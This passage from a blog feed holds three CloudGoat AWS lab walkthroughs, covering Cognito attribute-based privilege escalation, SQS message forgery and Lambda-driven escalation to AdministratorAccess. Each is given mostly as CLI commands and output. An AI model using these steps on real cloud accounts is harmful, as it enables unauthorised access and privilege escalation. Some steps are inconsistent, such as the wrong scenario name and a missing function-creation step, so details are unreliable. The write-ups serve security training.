class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Username&quot;: &quot;[USER_ID]&quot;,</span><br><span class="line">    &quot;UserAttributes&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Name&quot;: &quot;email&quot;,</span><br><span class="line">            &quot;Value&quot;: &quot;your-email@example.com&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Name&quot;: &quot;custom:access&quot;,</span><br><span class="line">            &quot;Value&quot;: &quot;reader&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>custom:access</code> attribute is currently set to “reader”, explaining our limited application access. If we can modify this attribute to “admin”, we should gain elevated privileges.</p><p>Attempt to update the custom access attribute:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp update-user-attributes   --access-token [ACCESS_TOKEN]   --user-attributes &#x27;[&#123;&quot;Name&quot;:&quot;custom:access&quot;,&quot;Value&quot;:&quot;admin&quot;&#125;]&#x27;</span><br></pre></td></tr></table></figure><p>Upon successful execution, verify the change by querying user attributes again. The <code>custom:access</code> value should now show “admin”.</p><h2 id="Obtaining-AWS-Credentials-via-Identity-Pool"><a href="#Obtaining-AWS-Credentials-via-Identity-Pool" class="headerlink" title="Obtaining AWS Credentials via Identity Pool"></a>Obtaining AWS Credentials via Identity Pool</h2><p>With admin privileges established, log back into the application and intercept the authentication requests using a web proxy like Burp Suite. This reveals additional infrastructure details, including the Identity Pool ID.</p><p><img src="/images/Cognito_Priv/proxy_login.png" alt="Image: Proxy Intercept Results"></p><p>The Identity Pool ID (<code>us-east-1:[IDENTITY_POOL_ID]</code>) is crucial for the final credential extraction phase.</p><p>Generate an Identity ID using the extracted information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-id   --region us-east-1   --identity-pool-id &#x27;[IDENTITY_POOL_ID]&#x27;   --logins &quot;cognito-idp.us-east-1.amazonaws.com/[USER_POOL_ID]=[ID_TOKEN]&quot;</span><br></pre></td></tr></table></figure><p>This command returns a unique Identity ID that can be used to obtain temporary AWS credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;IdentityId&quot;: &quot;us-east-1:[IDENTITY_ID]&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Finally, obtain temporary AWS credentials using the Identity ID:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-credentials-for-identity   --identity-id &quot;[IDENTITY_ID]&quot;</span><br></pre></td></tr></table></figure><p>Success! The response contains temporary AWS credentials with specific permissions based on the Identity Pool’s IAM role configuration:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;IdentityId&quot;: &quot;us-east-1:[IDENTITY_ID]&quot;,</span><br><span class="line">    &quot;Credentials&quot;: &#123;</span><br><span class="line">        &quot;AccessKeyId&quot;: &quot;ASIA[REDACTED]&quot;,</span><br><span class="line">        &quot;SecretKey&quot;: &quot;[REDACTED]&quot;,</span><br><span class="line">        &quot;SessionToken&quot;: &quot;[REDACTED]&quot;,</span><br><span class="line">        &quot;Expiration&quot;: &quot;2025-05-29T23:37:16+03:00&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Security-Implications-and-Mitigation"><a href="#Security-Implications-and-Mitigation" class="headerlink" title="Security Implications and Mitigation"></a>Security Implications and Mitigation</h2><p>This CloudGoat AWS scenario demonstrates several critical security vulnerabilities in Amazon Cognito implementations:</p><p>Vulnerability Analysis:</p><ul><li>Insufficient validation of custom user attributes  </li><li>Lack of server-side authorization checks  </li><li>Overly permissive attribute modification policies  </li><li>Improper Identity Pool configuration</li></ul><p>Attack Impact:<br>Attackers who successfully exploit these vulnerabilities can:  </p><ul><li>Bypass authentication mechanisms  </li><li>Escalate privileges from standard user to administrator  </li><li>Obtain valid AWS credentials  </li><li>Access additional AWS resources based on Identity Pool permissions</li></ul><p>Recommended Mitigations:  </p><ol><li>Implement server-side validation for all custom attributes  </li><li>Restrict attribute modification capabilities through IAM policies  </li><li>Use fine-grained IAM roles for Identity Pool authentication  </li><li>Implement proper authorization checks at the application level  </li><li>Regular security audits of Cognito configurations</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudgoat-SQS_Flag_Shop</title>
      <link href="/2025/05/27/Cloudgoat-SQS-Flag-Shop/"/>
      <url>/2025/05/27/Cloudgoat-SQS-Flag-Shop/</url>
      
        <content type="html"><![CDATA[<h1 id="CloudGoat-SQS-Lambda-Privesc-Walkthrough"><a href="#CloudGoat-SQS-Lambda-Privesc-Walkthrough" class="headerlink" title="CloudGoat SQS Lambda Privesc Walkthrough"></a>CloudGoat SQS Lambda Privesc Walkthrough</h1><p>This comprehensive CloudGoat walkthrough demonstrates how to exploit SQS (Simple Queue Service) vulnerabilities to achieve privilege escalation in AWS environments. We’ll use CloudTap, an advanced AWS security testing tool, to automate enumeration and role assumption for efficient penetration testing.</p><h2 id="Initial-Setup-and-Configuration"><a href="#Initial-Setup-and-Configuration" class="headerlink" title="Initial Setup and Configuration"></a>Initial Setup and Configuration</h2><p>First, whitelist your IP address to ensure proper access to CloudGoat resources:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure><p>Create the lambda_privesc scenario:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create lambda_privesc</span><br></pre></td></tr></table></figure><p>The setup provides initial credentials and target information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat_output_sqsuser_access_key_id = AKIAQ6VKGD5Y2RVBYOH6</span><br><span class="line">cloudgoat_output_sqsuser_secret_key = [REDACTED]</span><br><span class="line">web_site_ip = http://35.153.201.178:5000</span><br></pre></td></tr></table></figure><h2 id="Target-Analysis"><a href="#Target-Analysis" class="headerlink" title="Target Analysis"></a>Target Analysis</h2><p>Accessing the web application reveals a shopping website with a coin-based payment system:</p><p><img src="/images/Sqs_Flag_Shop/web_page.png" alt="Image: Web Application Interface"></p><p>The application allows users to charge their account with coins through a POST request to <code>/charge_cash/10</code>. Analysis of the network traffic shows the charging mechanism uses specific amounts (1, 5, or 10 coins) with a 20-second delay.</p><h2 id="Enumeration-with-CloudTap"><a href="#Enumeration-with-CloudTap" class="headerlink" title="Enumeration with CloudTap"></a>Enumeration with CloudTap</h2><p><a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> is an innovative AWS security assessment tool that streamlines the enumeration process by automatically discovering permissions, roles, and potential attack vectors. Unlike manual enumeration, CloudTap provides comprehensive visibility into AWS environments with automated role assumption capabilities.</p><p>Run CloudTap with the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py</span><br></pre></td></tr></table></figure><p>Using CloudTap for initial reconnaissance reveals:</p><ul><li>Role: <code>cg-sqs-send-message-cgidax1f0hnq4i</code></li><li>Permissions: <code>sqs:GetQueueUrl</code> and <code>sqs:SendMessage</code></li><li>Automatic role assumption capability detected</li></ul><p><img src="/images/Sqs_Flag_Shop/Cloud_Tap_assume.png" alt="Image: CloudTap Role Assumption"></p><p><a href="https://github.com/PanosoikoGr/CloudTap">CloudTap’s</a> automated approach significantly reduces manual testing time while ensuring comprehensive coverage of AWS attack surfaces.</p><p>Verify the assumed role identity:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile init</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;UserId&quot;: &quot;AROAQ6VKGD5YVZOGE6GS6:SecurityTest-cg-sqs-user-cgidax1f0hnq4i-cg-sqs-send-message-&quot;,</span><br><span class="line">    &quot;Account&quot;: &quot;065855168369&quot;,</span><br><span class="line">    &quot;Arn&quot;: &quot;arn:aws:sts::065855168369:assumed-role/cg-sqs-send-message-cgidax1f0hnq4i/SecurityTest-cg-sqs-user-cgidax1f0hnq4i-cg-sqs-send-message-&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SQS-Queue-Discovery"><a href="#SQS-Queue-Discovery" class="headerlink" title="SQS Queue Discovery"></a>SQS Queue Discovery</h2><p>Retrieve the SQS queue URL using the discovered queue name:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sqs get-queue-url --queue-name cash_charging_queue --profile init</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;QueueUrl&quot;: &quot;https://sqs.us-east-1.amazonaws.com/065855168369/cash_charging_queue&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p>Examining the application’s source code reveals the charge_cash function logic:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">@app.route(&#x27;/charge_cash/&lt;cash&gt;&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def charge_cash(cash):</span><br><span class="line">    cash = int(cash)</span><br><span class="line">    if cash==1 or cash==5 or cash==10:</span><br><span class="line">        msg = &#123;&quot;charge_amount&quot; : cash&#125;</span><br><span class="line">        message_body = json.dumps(msg)</span><br><span class="line">        response = sqs.sqs_client.send_message(</span><br><span class="line">          QueueUrl=sqs.sqs_queue_url,</span><br><span class="line">          MessageBody=message_body</span><br><span class="line">        )</span><br><span class="line">        time.sleep(10)</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line">    else:</span><br><span class="line">        return &quot;BAD Request!!&quot;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>The vulnerability lies in the ability to directly send messages to the SQS queue, bypassing the web application’s input validation.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Craft a malicious SQS message with an inflated charge amount:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/065855168369/cash_charging_queue --message-body &#x27;&#123;&quot;charge_amount&quot;: 100000000&#125;&#x27; --profile init</span><br></pre></td></tr></table></figure><p>After sending the message, refresh the web application to see the inflated coin balance, then purchase the flag:</p><p><img src="/images/Sqs_Flag_Shop/Flag.png" alt="Image: Flag Retrieved"></p><h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><p>This CloudGoat walkthrough demonstrates critical SQS security considerations:</p><ul><li>Direct queue access can bypass application-level controls</li><li>Message validation should occur at both application and queue levels</li><li>Principle of least privilege must be applied to SQS permissions</li><li><a href="https://github.com/PanosoikoGr/CloudTap">CloudTap’s</a> automated enumeration significantly accelerates security assessments</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudgoat-Lambda-Privesc</title>
      <link href="/2025/05/26/Cloudgoat-Lambda-Privesc/"/>
      <url>/2025/05/26/Cloudgoat-Lambda-Privesc/</url>
      
        <content type="html"><![CDATA[<h1 id="CloudGoat-Lambda-Privilege-Escalation-Walkthrough"><a href="#CloudGoat-Lambda-Privilege-Escalation-Walkthrough" class="headerlink" title="CloudGoat Lambda Privilege Escalation Walkthrough"></a>CloudGoat Lambda Privilege Escalation Walkthrough</h1><p>This walkthrough demonstrates a complete CloudGoat Lambda privilege escalation scenario using the powerful CloudTap enumeration tool. We’ll explore how an attacker can leverage Lambda functions and IAM role passing to escalate from limited permissions to full administrative access in an AWS environment. This CloudGoat walkthrough showcases a critical privilege escalation path that security professionals should understand and defend against.</p><h2 id="Initial-Setup"><a href="#Initial-Setup" class="headerlink" title="Initial Setup"></a>Initial Setup</h2><p>First, configure CloudGoat to whitelist your IP address:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure><p>Create the Lambda privilege escalation scenario:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create lambda_privesc</span><br></pre></td></tr></table></figure><p>You’ll receive initial credentials:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">raynor_access_key_id = AKIAQ6VKGD5Y[REDACTED]</span><br><span class="line">raynor_secret_access_key = E4iMHEH4Zu3brER[REDACTED]</span><br></pre></td></tr></table></figure><h2 id="Automated-Enumeration-with-CloudTap"><a href="#Automated-Enumeration-with-CloudTap" class="headerlink" title="Automated Enumeration with CloudTap"></a>Automated Enumeration with CloudTap</h2><p>For this walkthrough, we’ll use <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a>, an excellent automation tool that streamlines the initial enumeration phase of AWS penetration testing. CloudTap automatically discovers permissions, roles, and potential privilege escalation paths, making it invaluable for security assessments.</p><h3 id="Initial-Permission-Discovery"><a href="#Initial-Permission-Discovery" class="headerlink" title="Initial Permission Discovery"></a>Initial Permission Discovery</h3><p>CloudTap reveals the following attached policy:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Found attached policy<span class="punctuation">:</span> cg-chris-policy-cgid<span class="punctuation">[</span>REDACTED<span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chris&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sts:AssumeRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:List*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:Get*&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Role-Discovery-and-Auto-Assumption"><a href="#Role-Discovery-and-Auto-Assumption" class="headerlink" title="Role Discovery and Auto-Assumption"></a>Role Discovery and Auto-Assumption</h3><p>CloudTap also identifies a potential role we can assume:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sts:AssumeRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::[ACCOUNT-ID]:user/chris-cgid[REDACTED]&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>One of CloudTap’s powerful features is its ability to automatically assume roles when the user has <code>AssumeRole</code> permissions. The tool provides temporary session credentials:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Temporary session credentials<span class="punctuation">:</span></span><br><span class="line">  - AccessKeyId<span class="punctuation">:</span> ASIAQ6VKGD5Y<span class="punctuation">[</span>REDACTED<span class="punctuation">]</span></span><br><span class="line">  - SecretAccessKey<span class="punctuation">:</span> NzeCDw9v7Vw5QT9E<span class="punctuation">[</span>REDACTED<span class="punctuation">]</span></span><br><span class="line">  - SessionToken<span class="punctuation">:</span> FwoGZXIvYXdzEH4a<span class="punctuation">[</span>REDACTED<span class="punctuation">]</span></span><br><span class="line">  - Expiration<span class="punctuation">:</span> <span class="number">2025</span><span class="number">-05</span><span class="number">-25</span> <span class="number">22</span><span class="punctuation">:</span><span class="number">01</span><span class="punctuation">:</span><span class="number">09</span>+<span class="number">00</span><span class="punctuation">:</span><span class="number">00</span></span><br></pre></td></tr></table></figure><h2 id="Permission-Analysis"><a href="#Permission-Analysis" class="headerlink" title="Permission Analysis"></a>Permission Analysis</h2><h3 id="Lambda-Manager-Role-Permissions"><a href="#Lambda-Manager-Role-Permissions" class="headerlink" title="Lambda Manager Role Permissions"></a>Lambda Manager Role Permissions</h3><p>Let’s examine what permissions our assumed role provides. First, get the policy ARN:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-attached-role-policies --role-name cg-lambdaManager-role-cgid[REDACTED] --profile init</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;AttachedPolicies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;PolicyName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cg-lambdaManager-policy-cgid[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PolicyArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::[ACCOUNT-ID]:policy/cg-lambdaManager-policy-cgid[REDACTED]&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Get the policy details:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam get-policy --policy-arn arn:aws:iam::[ACCOUNT-ID]:policy/cg-lambdaManager-policy-cgid[REDACTED] --profile init</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Policy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;PolicyName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cg-lambdaManager-policy-cgid[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;PolicyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::[ACCOUNT-ID]:policy/cg-lambdaManager-policy-cgid[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DefaultVersionId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;AttachmentCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;IsAttachable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Provides permissions to manage Lambda functions.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-05-25T22:00:00Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;UpdateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-05-25T22:00:00Z&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Target-Role-Discovery"><a href="#Target-Role-Discovery" class="headerlink" title="Target Role Discovery"></a>Target Role Discovery</h3><p>CloudTap also identifies a target role that we can assume:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sts:AssumeRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::[ACCOUNT-ID]:role/cg-target-role-cgid[REDACTED]&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation-Strategy"><a href="#Privilege-Escalation-Strategy" class="headerlink" title="Privilege Escalation Strategy"></a>Privilege Escalation Strategy</h2><p>With the <code>sts:AssumeRole</code> permission for the <code>cg-target-role-cgid[REDACTED]</code> role, we can escalate our privileges. Assuming this role provides us with higher-level permissions, potentially including administrative access.</p><h2 id="Lambda-Function-Creation-and-Exploitation"><a href="#Lambda-Function-Creation-and-Exploitation" class="headerlink" title="Lambda Function Creation and Exploitation"></a>Lambda Function Creation and Exploitation</h2><h3 id="Creating-the-Malicious-Lambda-Function"><a href="#Creating-the-Malicious-Lambda-Function" class="headerlink" title="Creating the Malicious Lambda Function"></a>Creating the Malicious Lambda Function</h3><p>To exploit the Lambda function, we can create a malicious Lambda function that performs actions such as attaching policies to users or roles. The function’s code might look like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    iam = boto3.client(<span class="string">&#x27;iam&#x27;</span>)</span><br><span class="line">    response = iam.attach_user_policy(</span><br><span class="line">        UserName=<span class="string">&#x27;raynor&#x27;</span>,</span><br><span class="line">        PolicyArn=<span class="string">&#x27;arn:aws:iam::aws:policy/AdministratorAccess&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><h3 id="Function-Execution"><a href="#Function-Execution" class="headerlink" title="Function Execution"></a>Function Execution</h3><p>Invoke the Lambda function to execute the malicious actions:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke --function-name maliciousLambdaFunction output.txt</span><br></pre></td></tr></table></figure><h2 id="Verification-of-Privilege-Escalation"><a href="#Verification-of-Privilege-Escalation" class="headerlink" title="Verification of Privilege Escalation"></a>Verification of Privilege Escalation</h2><p>After executing the malicious Lambda function, verify that the <code>raynor</code> user has been granted administrative privileges:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-attached-user-policies --user-name raynor --profile init</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;AttachedPolicies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;PolicyName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AdministratorAccess&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PolicyArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::aws:policy/AdministratorAccess&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span 